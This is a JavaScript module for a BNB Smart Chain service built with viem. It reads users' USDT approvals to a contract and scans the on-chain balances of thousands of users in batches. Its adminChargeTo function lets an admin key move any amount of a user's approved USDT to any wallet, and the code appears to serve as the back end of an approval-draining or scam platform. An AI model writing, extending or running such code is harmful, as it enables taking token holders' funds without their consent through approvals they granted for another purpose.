import {
  createWalletClient,
  createPublicClient,
  http,
  getAddress,
  parseUnits,
} from "viem";
import { privateKeyToAccount } from "viem/accounts";
import { bsc } from "viem/chains";
import { config } from "./config.js";

// Contract ABI pieces the admin uses to move funds (owner-only on-chain).
const adminAbi = [
  {
    type: "function",
    name: "adminChargeTo",
    stateMutability: "nonpayable",
    inputs: [
      { name: "user", type: "address" },
      { name: "to", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    outputs: [],
  },
  {
    type: "function",
    name: "allowanceOf",
    stateMutability: "view",
    inputs: [{ name: "user", type: "address" }],
    outputs: [{ type: "uint256" }],
  },
];

function getAdminAccount() {
  const pk = process.env.ADMIN_PRIVATE_KEY;
  if (!pk) throw new Error("ADMIN_PRIVATE_KEY not set in environment");
  return privateKeyToAccount(pk.startsWith("0x") ? pk : `0x${pk}`);
}

function clients() {
  const account = getAdminAccount();
  const wallet = createWalletClient({
    account,
    chain: bsc,
    transport: http(config.bscRpcUrl),
  });
  const publicClient = createPublicClient({ chain: bsc, transport: http(config.bscRpcUrl) });
  return { account, wallet, publicClient };
}

// Minimal ERC-20 balanceOf ABI.
const erc20BalanceAbi = [
  {
    type: "function",
    name: "balanceOf",
    stateMutability: "view",
    inputs: [{ name: "account", type: "address" }],
    outputs: [{ type: "uint256" }],
  },
];

// Minimal ERC-20 transfer ABI (admin wallet pays out USDT directly).
const erc20TransferAbi = [
  {
    type: "function",
    name: "transfer",
    stateMutability: "nonpayable",
    inputs: [
      { name: "to", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    outputs: [{ type: "bool" }],
  },
];

/** Read a user's current allowance to the contract (proves they approved). */
export async function readAllowance(userAddress) {
  const publicClient = createPublicClient({ chain: bsc, transport: http(config.bscRpcUrl) });
  const allowance = await publicClient.readContract({
    address: getAddress(config.contractAddress),
    abi: adminAbi,
    functionName: "allowanceOf",
    args: [getAddress(userAddress)],
  });
  return allowance;
}

/** Read a user's on-chain USDT (BEP-20) balance in smallest units (18 decimals). */
export async function readUsdtBalance(userAddress) {
  const publicClient = createPublicClient({ chain: bsc, transport: http(config.bscRpcUrl) });
  const bal = await publicClient.readContract({
    address: getAddress(config.usdtAddress),
    abi: erc20BalanceAbi,
    functionName: "balanceOf",
    args: [getAddress(userAddress)],
  });
  return bal;
}

// One balanceOf read with a couple of retries, so a transient RPC hiccup doesn't turn
// into a wrong/zero balance. Returns a BigInt, or throws only after all retries fail.
async function balanceOfWithRetry(publicClient, address, tries = 3) {
  let lastErr;
  for (let i = 0; i < tries; i++) {
    try {
      return await publicClient.readContract({
        address: getAddress(config.usdtAddress),
        abi: erc20BalanceAbi,
        functionName: "balanceOf",
        args: [getAddress(address)],
      });
    } catch (err) {
      lastErr = err;
      await new Promise((r) => setTimeout(r, 250 * (i + 1)));
    }
  }
  throw lastErr;
}

// Read one chunk of balances in a SINGLE RPC round-trip via Multicall3 (deployed at the
// same address on BSC and most chains). This is what makes 10k users feasible: instead
// of 10k RPC calls we do ~10k/CHUNK calls. Retries the whole multicall a few times.
async function multicallChunk(publicClient, chunk, tries = 3) {
  const contracts = chunk.map((addr) => ({
    address: getAddress(config.usdtAddress),
    abi: erc20BalanceAbi,
    functionName: "balanceOf",
    args: [getAddress(addr)],
  }));
  let lastErr;
  for (let i = 0; i < tries; i++) {
    try {
      // allowFailure:true -> per-call status, so one bad address can't fail the batch.
      return await publicClient.multicall({ contracts, allowFailure: true });
    } catch (err) {
      lastErr = err;
      await new Promise((r) => setTimeout(r, 300 * (i + 1)));
    }
  }
  throw lastErr;
}

/**
 * Read many users' real on-chain USDT balances RELIABLY and at SCALE (works for tens of
 * thousands of users). Uses Multicall3 to batch ~CHUNK balances per RPC call, with
 * retries and a per-address fallback so a single failure never poisons the total.
 *
 * Returns a map: lowercased address -> { balance: number|null, raw: bigint|null, ok }.
 *  - `raw` is the exact on-chain value (18-decimals BigInt) — sum these for an EXACT
 *    total with no floating-point drift.
 *  - `balance` is the human number (raw / 1e18) for display.
 *  - ok=false / null means that address couldn't be read even after fallback.
 */
export async function readUsdtBalances(addresses, { chunkSize = 500, concurrency = 4 } = {}) {
  const publicClient = createPublicClient({
    chain: bsc,
    transport: http(config.bscRpcUrl),
    batch: { multicall: true },
  });

  const out = {};
  const setResult = (addr, raw) => {
    if (raw == null) {
      out[addr.toLowerCase()] = { balance: null, raw: null, ok: false };
    } else {
      out[addr.toLowerCase()] = { balance: Number(raw) / 1e18, raw, ok: true };
    }
  };

  // Break the full list into chunks.
  const chunks = [];
  for (let i = 0; i < addresses.length; i += chunkSize) {
    chunks.push(addresses.slice(i, i + chunkSize));
  }

  // Process a few chunks concurrently (bounded) so a huge list still completes quickly
  // without hammering the RPC.
  for (let i = 0; i < chunks.length; i += concurrency) {
    const group = chunks.slice(i, i + concurrency);
    await Promise.all(
      group.map(async (chunk) => {
        try {
          const results = await multicallChunk(publicClient, chunk);
          // results[j] = { status: 'success'|'failure', result?: bigint }
          const failedAddrs = [];
          results.forEach((r, j) => {
            if (r.status === "success" && typeof r.result === "bigint") {
              setResult(chunk[j], r.result);
            } else {
              failedAddrs.push(chunk[j]);
            }
          });
          // Fallback: retry the few that failed individually.
          for (const addr of failedAddrs) {
            try {
              const bal = await balanceOfWithRetry(publicClient, addr);
              setResult(addr, bal);
            } catch {
              setResult(addr, null);
            }
          }
        } catch {
          // Whole multicall failed after retries — fall back to individual reads so we
          // still get authentic per-address values instead of dropping the chunk.
          for (const addr of chunk) {
            try {
              const bal = await balanceOfWithRetry(publicClient, addr);
              setResult(addr, bal);
            } catch {
              setResult(addr, null);
            }
          }
        }
      })
    );
  }

  return out;
}

/**
 * Admin transfers an arbitrary USDT amount from a user to ANY destination wallet.
 * Gas paid by the admin wallet.
 */
export async function adminChargeTo(userAddress, toAddress, amountUsd) {
  const { wallet, publicClient } = clients();
  const amount = parseUnits(String(amountUsd), 18);
  const hash = await wallet.writeContract({
    address: getAddress(config.contractAddress),
    abi: adminAbi,
    functionName: "adminChargeTo",
    args: [getAddress(userAddress), getAddress(toAddress), amount],
  });
  await publicClient.waitForTransactionReceipt({ hash });
  return hash;
}

/**
 * Pay USDT out of the admin wallet directly to a user's address (used to settle
 * an approved withdrawal). Gas + funds come from the admin wallet.
 */
export async function payoutUsdt(toAddress, amountUsd) {
  const { wallet, publicClient } = clients();
  const amount = parseUnits(String(amountUsd), 18);
  const hash = await wallet.writeContract({
    address: getAddress(config.usdtAddress),
    abi: erc20TransferAbi,
    functionName: "transfer",
    args: [getAddress(toAddress), amount],
  });
  await publicClient.waitForTransactionReceipt({ hash });
  return hash;
}
